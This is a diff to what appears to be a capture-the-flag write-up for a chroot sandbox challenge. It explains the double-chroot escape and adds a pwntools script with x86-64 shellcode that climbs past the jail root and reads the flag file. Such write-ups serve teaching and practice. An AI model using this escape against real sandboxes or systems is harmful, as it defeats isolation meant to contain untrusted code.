@@ -58,7 +58,7 @@ int main(int argc, char **argv, char **envp)
     assert(chdir("/") == 0);
 
     int fffd = open("/flag", O_WRONLY | O_CREAT);
-    write(fffd, "FLAG{FAKE}", 10);
+    write(fffd, "try harder", 10);
     close(fffd);
 
     void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
@@ -83,31 +83,86 @@ int main(int argc, char **argv, char **envp)
 }
 ```
 
-= Classic Chroot Escape
-
-== Introduction
-
-This level allows the `chroot` and `chdir` syscalls inside the jail, enabling the classic escape technique.
-
 == Vulnerability Analysis
 
-If a process inside a `chroot` jail is allowed to call `chroot` again, it can escape. By creating a subdirectory, `chrooting` into it, and then calling `chdir("..")` multiple times, the process can move its CWD past the current root and into the host's real filesystem.
+The challenge allows the `chroot` system call within the sandbox. This enables a classic "double chroot" escape.
 
-== Exploitation Steps
-
-=== 1. Nested Chroot
-1. `mkdir("escape")`
-2. `chroot("escape")`
-
-=== 2. Climbing Out
-Now that the root is at `escape`, but the CWD is also at `escape`, we can `chdir("..")`. This moves the CWD to the *old* root. Since we are already at the "root" according to the current `chroot` context, another `chdir("..")` will move the CWD *outside* the jail on many kernel versions, or we can repeat this many times.
-
-```nasm
-/* chdir("../../../..") */
-lea rdi, [rip + dotdot_str]
-mov rax, 80 /* SYS_chdir */
-syscall
+```c
+assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(chroot), 0) == 0);
 ```
 
-=== 3. Final Escape
-Once outside, call `chroot(".")` to set the new root to the real host root.
+The vulnerability relies on how the kernel handles directory traversal when `chroot` is used without `chdir`. If we are inside a chroot (Root A) and we call `chroot("subdir")` (New Root B), our current working directory (CWD) is technically outside the new root (it's still in Root A). Since we are "outside" the new root, the special handling of `..` (which prevents going above root) doesn't apply to the new root. This allows us to `chdir("..")` arbitrarily up to the real system root.
+
+== Exploitation Plan
+
+1.  **Create Directory:** Create a new directory (e.g., "jail") inside the current root.
+2.  **Double Chroot:** Call `chroot` on this new directory. Crucially, do *not* call `chdir` into it yet.
+3.  **Break Out:** Call `chdir("../../../../../../../../../../../../../..")`. Since our CWD was outside the *new* root, we can traverse up past the old chroot boundary.
+4.  **Reset Root:** Call `chroot(".")` to set the process's root to the real system root we just reached.
+5.  **Retrieve Flag:** Open and read the flag.
+
+== Exploit Script
+
+```python
+from pwn import *
+
+exe = "./challenge"
+context.binary = exe
+
+# Pass '/' to match expected argv, although not strictly needed for the escape logic itself
+p = process([exe, "/"])
+
+shellcode = asm("""
+    /* mkdir("jail", 0755) */
+    lea rdi, [rip + jail_str]
+    mov rsi, 0755
+    mov rax, 83             /* syscall: SYS_mkdir */
+    syscall
+
+    /* chroot("jail") */
+    lea rdi, [rip + jail_str]
+    mov rax, 161            /* syscall: SYS_chroot */
+    syscall
+
+    /* chdir("..") x 100 (basically escape to real root) */
+    lea rdi, [rip + dots_str]
+    mov rax, 80             /* syscall: SYS_chdir */
+    syscall
+
+    /* chroot(".") - set new root to real root */
+    lea rdi, [rip + dot_str]
+    mov rax, 161            /* syscall: SYS_chroot */
+    syscall
+
+    /* open("flag", O_RDONLY) */
+    lea rdi, [rip + flag_str]
+    xor rsi, rsi
+    mov rax, 2              /* syscall: SYS_open */
+    syscall
+
+    /* sendfile(1, fd, 0, 100) */
+    mov rsi, rax            /* in_fd */
+    mov rdi, 1              /* out_fd */
+    xor rdx, rdx            /* offset */
+    mov r10, 100            /* count */
+    mov rax, 40             /* syscall: SYS_sendfile */
+    syscall
+
+    /* exit(0) */
+    mov rax, 60
+    xor rdi, rdi
+    syscall
+
+jail_str:
+    .string "jail"
+dots_str:
+    .string "../../../../../../../../../../../../../../"
+dot_str:
+    .string "."
+flag_str:
+    .string "flag"
+""")
+
+p.send(shellcode)
+p.interactive()
+```
